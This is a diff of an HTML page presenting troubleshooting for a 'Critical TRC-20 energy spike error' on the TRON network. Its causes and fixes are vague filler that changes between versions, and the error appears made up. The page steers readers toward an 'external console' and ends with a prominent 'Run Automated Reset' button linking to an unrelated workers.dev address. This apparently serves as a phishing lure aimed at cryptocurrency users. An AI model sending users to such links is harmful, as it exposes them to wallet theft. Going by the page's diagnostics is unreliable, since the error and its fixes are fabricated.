@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: BlinkMacSystemFont;
-        background: #121214;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #ff9455; }
     .btn {
-        background: #ff9455;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,34 +42,35 @@
 <h1>Critical Trc 20 Energy Spike Error</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a sudden and significant increase in energy consumption when interacting with TRC-20 tokens on the TRON network, resulting in failed transactions and high energy costs.</li>
+<li>Users encounter a "Critical TRC-20 energy spike error" message when attempting to transfer TRC-20 tokens on the TRON network, resulting in failed transactions and significant delays.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to an imbalance in the network's energy allocation, causing a spike in energy consumption for TRC-20 transactions, which can be triggered by various factors such as network congestion, smart contract optimization issues, or misconfigured energy settings.</li>
+<li>The error occurs due to an unexpected surge in energy consumption by smart contracts, exceeding the allocated energy limits for TRC-20 token transactions, thereby causing the network to reject the transactions.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Adjust the <code>energyLimit</code> parameter in the transaction configuration to mitigate the energy spike.</li>
-<li>Implement a retry mechanism with exponential backoff to handle temporary energy fluctuations.</li>
-<li>Optimize smart contract code to reduce energy consumption:</li>
+<li>Increase the energy limit for the specific smart contract:</li>
+<li>Update the contract's energy configuration using the <code>tronweb</code> library</li>
+<li>Use the following JSON configuration to override the default energy settings:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;transaction&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;energyLimit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">100000</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;energyPrice&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
-<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="nt">&quot;energyLimit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1000000</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;energyFee&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced troubleshooting and configuration adjustments. </p>
+<ul>
+<li>Execute a transaction with the updated energy configuration to override the default settings
+Consider using an external console, such as TronBox, for more advanced troubleshooting and configuration options.</li>
+</ul>
 <h2>Prerequisites</h2>
 <ul>
-<li>Basic understanding of TRON network architecture</li>
-<li>Familiarity with TRC-20 token standards</li>
-<li>Access to a TRON-compatible wallet or development environment</li>
+<li>TRON network node synchronization</li>
+<li>tronweb library installation</li>
+<li>Basic understanding of TRON smart contract configuration</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-using-waituntil-to-ensure-all-scripts-load.html">Metamask Extension Using Waituntil To Ensure All Scripts Load</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/metamask-extension-bug-unable-to-cancel-pending-transaction-due.html">Metamask Extension Bug Unable To Cancel Pending Transaction Due</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-unable-to-cancel-pending-transaction-due.html">Metamask Extension Bug Unable To Cancel Pending Transaction Due</a></li><li><a href="./archive/2026/06/metamask-extension-using-waituntil-to-ensure-async-storage-writ.html">Metamask Extension Using Waituntil To Ensure Async Storage Writes Finish</a></li><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
 </div>
